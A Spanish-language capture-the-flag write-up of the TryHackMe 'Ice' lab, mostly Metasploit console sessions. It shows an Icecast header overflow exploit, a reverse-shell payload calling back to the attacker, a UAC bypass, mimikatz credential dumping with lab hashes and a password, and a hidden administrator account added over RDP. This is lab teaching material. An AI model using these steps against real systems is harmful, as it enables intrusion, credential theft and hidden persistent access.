---
title: Ice - TryHackMe
date: 2025-01-29 11:00:00 -0000
categories: [Labs & CTF, Write Up, TryHackMe]
tags: [Windows, Metasploit, Tryhackme]
image:
  path: /assets/img/posts/ICE-tryhackme/cabecera.png
  alt: Texto alternativo para la imagen
  caption: ICE  
description: >
  Write Up Ice - TryHackMe
pin: false  
toc: true   
math: false 
mermaid: false 
---

## Escanep de puertos

```bash
nmap -sC -sV -O 10.10.19.146
```
```bash
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-29 17:09 CET
Nmap scan report for 10.10.19.146
Host is up (0.048s latency).
Not shown: 988 closed tcp ports (reset)
PORT      STATE SERVICE        VERSION
135/tcp   open  msrpc          Microsoft Windows RPC
139/tcp   open  netbios-ssn    Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds   Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ms-wbt-server?
|_ssl-date: 2025-01-29T16:11:07+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=Dark-PC
| Not valid before: 2025-01-28T16:06:30
|_Not valid after:  2025-07-30T16:06:30
| rdp-ntlm-info: 
|   Target_Name: DARK-PC
|   NetBIOS_Domain_Name: DARK-PC
|   NetBIOS_Computer_Name: DARK-PC
|   DNS_Domain_Name: Dark-PC
|   DNS_Computer_Name: Dark-PC
|   Product_Version: 6.1.7601
|_  System_Time: 2025-01-29T16:11:01+00:00
5357/tcp  open  http           Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Service Unavailable
|_http-server-header: Microsoft-HTTPAPI/2.0
8000/tcp  open  http           Icecast streaming media server
|_http-title: Site doesn't have a title (text/html).
49152/tcp open  msrpc          Microsoft Windows RPC
49153/tcp open  msrpc          Microsoft Windows RPC
49154/tcp open  msrpc          Microsoft Windows RPC
49158/tcp open  msrpc          Microsoft Windows RPC
49159/tcp open  msrpc          Microsoft Windows RPC
49160/tcp open  msrpc          Microsoft Windows RPC
Device type: general purpose
Running: Microsoft Windows 2008|7|Vista|8.1
OS CPE: cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_vista cpe:/o:microsoft:windows_8.1
OS details: Microsoft Windows Vista SP2 or Windows 7 or Windows Server 2008 R2 or Windows 8.1
Network Distance: 2 hops
Service Info: Host: DARK-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_nbstat: NetBIOS name: DARK-PC, NetBIOS user: <unknown>, NetBIOS MAC: 02:8f:fb:8c:b7:f7 (unknown)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled but not required
|_clock-skew: mean: 1h12m00s, deviation: 2h41m00s, median: 0s
| smb2-time: 
|   date: 2025-01-29T16:11:01
|_  start_date: 2025-01-29T16:06:28
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: Dark-PC
|   NetBIOS computer name: DARK-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2025-01-29T10:11:01-06:00
```

> Vemos puertos interesantes como
  - 445/tcp   open  microsoft-ds   Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
  - 3389/tcp  open  Microsoft Remote Desktop Protocol 
  - 5357/tcp  open  http           Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
  - 8000/tcp  open  http           Icecast streaming media server

El nombre de la máquina es `Dark-PC` y parece tener un servidor de streaming de audio y video.

## Investigando el servicio Icecast

Si nos fijamos en el servicio multimeda que se está sirviendo podemos investigar por la web que existe una vulnerabilidad concreta que afecta a las cabeceras HTTP con gran número de carácteres, provocando un buffer overflow y permitiendo así la ejecución de código remoto en el servidor.

[CVE-2004-1561](https://www.cvedetails.com/cve/CVE-2004-1561/)

## Ganando acceso

En este caso vamos a hacer uso del framework Metasploit. Para más información sobre esta herramienta visita el post en el que explicamos todas sus funciones [MSF](https://sproffes.github.io/posts/Metasploit/)

Una vez dentro de `msconsole` vamos a buscar exploits para esta versión de Icecast 2.0.1

```bash
msf6 > search icecast 2.0.1

Matching Modules
================

   #  Name                                 Disclosure Date  Rank   Check  Description
   -  ----                                 ---------------  ----   -----  -----------
   0  exploit/windows/http/icecast_header  2004-09-28       great  No     Icecast Header Overwrite


Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/http/icecast_header
```

Vamos a configurar el exploit con la IP destino y la IP de nuestra máquina.

```bash
msf6 > use 0
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/http/icecast_header) > options

Module options (exploit/windows/http/icecast_header):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS                   yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT   8000             yes       The target port (TCP)


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.100.210  yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic



View the full module info with the info, or info -d command.

msf6 exploit(windows/http/icecast_header) > set RHOSTS 10.10.19.146
RHOSTS => 10.10.19.146
msf6 exploit(windows/http/icecast_header) > set LHOST 10.8.17.92
LHOST => 10.8.17.92
```

Ahora para poder ejecutar el exploit debemos invocar el comando `run`

```bash
msf6 exploit(windows/http/icecast_header) > run
[*] Started reverse TCP handler on 10.8.17.92:9000 
[*] Sending stage (177734 bytes) to 10.10.19.146
[*] Meterpreter session 1 opened (10.8.17.92:9000 -> 10.10.19.146:49233) at 2025-01-29 17:38:24 +0100

meterpreter > getuid
Server username: Dark-PC\Dark
```
## Información sobre el servidor

Una vez dentro podemos usar ciertos comandos implementados en meterpreter para obtener información o navegar por el sistema, por ejemplo:

```bash
meterpreter > getuid
Server username: Dark-PC\Dark
meterpreter > sysinfo
Computer        : DARK-PC
OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x86/windows
```
A parte de comandos de varios que ofrece, metasploit implementa herramientas para intentar analizar posibles vulnerabilidades dentro del sistema para poder escalar privilegios.

```bash
meterpreter > run post/multi/recon/local_exploit_suggester
```
En este caso vamos a utilizar el siguiente exploit.

```bash
2   exploit/windows/local/bypassuac_eventvwr                       Yes                      The target appears to be vulnerable.
```

Ahora para poder hacer uso de este exploit mandaremos a segundo plano la sesión de meterpreter (`CTRL+Z`) y ejecutaremos el exploit.

## Escalando privilegios

Ahora desde msfconsole podemos ejecutar el exploit con el comando `use exploit/windows/local/bypassuac_eventvwr`

```bash
meterpreter > 
Background session 1? [y/N]  
msf6 exploit(windows/http/icecast_header) > use exploit/windows/local/bypassuac_eventvwr
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/local/bypassuac_eventvwr) > options

Module options (exploit/windows/local/bypassuac_eventvwr):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   yes       The session to run this module on


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.100.210  yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows x86



View the full module info with the info, or info -d command.

msf6 exploit(windows/local/bypassuac_eventvwr) > set SESSION 1
SESSION => 1
msf6 exploit(windows/local/bypassuac_eventvwr) > set LHOST 10.8.17.92
LHOST => 10.8.17.92
```

En este exploit nos pedirá el numero de la sesión de meterpreter, en este caso `1`, y la IP de nuestra máquina, en este caso `10.8.17.92`.

Importante si el puerto de escucha que anteriormente hemos configurado en el exploit no es el que está en uso, debemos cambiarlo.

```bash
msf6 exploit(windows/local/bypassuac_eventvwr) > set LPORT 9000
LPORT => 9000
msf6 exploit(windows/local/bypassuac_eventvwr) > run
[*] Started reverse TCP handler on 10.8.17.92:9000 
[*] UAC is Enabled, checking level...
[+] Part of Administrators group! Continuing...
[+] UAC is set to Default
[+] BypassUAC can bypass this setting, continuing...
[*] Configuring payload and stager registry keys ...
[*] Executing payload: C:\Windows\SysWOW64\eventvwr.exe
[+] eventvwr.exe executed successfully, waiting 10 seconds for the payload to execute.
[*] Sending stage (177734 bytes) to 10.10.19.146
[*] Meterpreter session 2 opened (10.8.17.92:9000 -> 10.10.19.146:49256) at 2025-01-29 17:57:55 +0100
[*] Cleaning up registry keys ...

meterpreter > getuid
Server username: Dark-PC\Dark
meterpreter > getprivs

Enabled Process Privileges
==========================

Name
----
SeBackupPrivilege
SeChangeNotifyPrivilege
SeCreateGlobalPrivilege
SeCreatePagefilePrivilege
SeCreateSymbolicLinkPrivilege
SeDebugPrivilege
SeImpersonatePrivilege
SeIncreaseBasePriorityPrivilege
SeIncreaseQuotaPrivilege
SeIncreaseWorkingSetPrivilege
SeLoadDriverPrivilege
SeManageVolumePrivilege
SeProfileSingleProcessPrivilege
SeRemoteShutdownPrivilege
SeRestorePrivilege
SeSecurityPrivilege
SeShutdownPrivilege
SeSystemEnvironmentPrivilege
SeSystemProfilePrivilege
SeSystemtimePrivilege
SeTakeOwnershipPrivilege
SeTimeZonePrivilege
SeUndockPrivilege
```

En este ejemplo el permiso que nos da el exploit es `SeTakeOwnershipPrivilege` .

Para poder acceder al servicio lsass donde se almacenan las credenciales de usuario en un sistema windows primero debemos intentar encontrar un proceso que sea ejecutado por el administrador del sistema ya que, aunque hayamos "escalado privilegios" no somos el administrador del sistema.

### Migración de procesos

Listamos los procesos que están en ejecución.

```bash
meterpreter > ps

1376  692   spoolsv.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\spoolsv.exe
```
Para interactuar con **lsass**, necesitamos migrar a un proceso que tenga la misma arquitectura que el servicio **lsass** (x64 en el caso de esta máquina) y que tenga los mismos permisos que **lsass**. El servicio de cola de impresión resulta ser perfecto para esto y se reiniciará si lo hacemos fallar. 

El servicio es el listado arriba.

Migrar a un proceso a menudo significa que, cuando tomamos el control de un programa en ejecución, terminamos cargando otra biblioteca compartida en el programa (un **DLL**) que incluye nuestro código malicioso. A partir de esto, podemos generar un nuevo hilo que aloje nuestra shell.

Para poder migrar el proceso, desde meterpreter

```bash
meterpreter > migrate -N spoolsv.exe 
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

Ahora podemos interactuar con el servicio lsass por lo que vamos a utilizar una herramienta para extraer datos de la la bases de datos de los sistemas windows llamada Mimikatz.

Meterpreter cuenta con un módulo implementado para cargarlo.

```bash
meterpreter > load kiwi
Loading extension kiwi...
  .#####.   mimikatz 2.2.0 20191125 (x64/windows)
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )
  '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/

Success.
meterpreter > creds_all
[+] Running as SYSTEM
[*] Retrieving all credentials
msv credentials
===============

Username  Domain   LM                                NTLM                              SHA1
--------  ------   --                                ----                              ----
Dark      Dark-PC  e52cac67419a9a22ecb08369099ed302  7c4fe5eada682714a036e39378362bab  0d082c4b4f2aeafb67fd0ea568a997e9d3ebc0eb

wdigest credentials
===================

Username  Domain     Password
--------  ------     --------
(null)    (null)     (null)
DARK-PC$  WORKGROUP  (null)
Dark      Dark-PC    Password01!

tspkg credentials
=================

Username  Domain   Password
--------  ------   --------
Dark      Dark-PC  Password01!

kerberos credentials
====================

Username  Domain     Password
--------  ------     --------
(null)    (null)     (null)
Dark      Dark-PC    Password01!
dark-pc$  WORKGROUP  (null)
```

## Post explotación 

### Habilitar el escritorio remoto

Llegados a ser administradores del sistema podemos realizar multitud de acciones haciendo uso de meterpreter.

Entre muchas de estas opciones podemos encontrar habilitar el escritorio remoto.

Para ello debemos ejecutar un modulo disponible en metasploit:

```bash
msf6 > use post/windows/manage/enable_rdp
```
Antes de proceder es necesario que tengamos un usuario con remote desktop habilitado en el sistema o, ya que tenemos privilegios dentro del sistema podemos hacer uso de ese modulo de metasploit para crear un usuario remoto y además con privilegios de administrador.

Al activar el modulo debemos configurarlo.

```bash
msf6 post(windows/manage/enable_rdp) > options

Module options (post/windows/manage/enable_rdp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   ENABLE    true             no        Enable the RDP Service and Firewall Exception.
   FORWARD   false            no        Forward remote port 3389 to local Port.
   LPORT                      yes       The local port to forward to.
   PASSWORD                   no        Password for the user created.
   SESSION   4                yes       The session to run this module on
   USERNAME                   no        The username of the user to create.


View the full module info with the info, or info -d command.

msf6 post(windows/manage/enable_rdp) > set SESSION 5
SESSION => 5
msf6 post(windows/manage/enable_rdp) > set USERNAME remote
USERNAME => remote
msf6 post(windows/manage/enable_rdp) > set PASSWORD remote
PASSWORD => remote
msf6 post(windows/manage/enable_rdp) > set LPORT 3389
LPORT => 3389
msf6 post(windows/manage/enable_rdp) > run
[*] Enabling Remote Desktop
[*] 	RDP is already enabled
[*] Setting Terminal Services service startup mode
[*] 	Terminal Services service is already set to auto
[*] 	Opening port in local firewall if necessary
[*] Setting user account for logon
[*] 	Adding User: remote with Password: remote
[*] 	Adding User: remote to local group 'Remote Desktop Users'
[*] 	Hiding user from Windows Login screen
[*] 	Adding User: remote to local group 'Administrators'
[*] You can now login with the created user
[*] For cleanup execute Meterpreter resource file: /home/kali/.msf4/loot/20250129190138_default_10.10.82.44_host.windows.cle_133751.txt
[*] Post module execution completed
```
### Conectando al escritorio remoto

Como estamos en un entorno linux podemos hacer uso de la herramienta `rdesktop` para conectarnos al escritorio remoto.

```bash
sudo apt install -y rdesktop
```

Ahora conectarse al escritorio remoto con el siguiente comando:

```bash
rdesktop -u remote -p remote 10.10.82.44
```

![Conexión al escritorio remoto](/assets/img/posts/ICE-tryhackme/remote_desktop.png)


### Otros comandos

Otros comandos disponibles que podemos realizar desde la shell de meterpreter podrían ser los
siguientes:
- hashdump. Hace un volcado de hashes almacenados en la base de datos SAM.
- screenshare. Permite ver el escritorio de la máquina víctima en tiempo real.
- record_mic. Graba audio desde el micrófono por defecto de la máquina víctima.
- Timestomp. Manipula datos de fechas de ficheros para complicar el análisis forense.
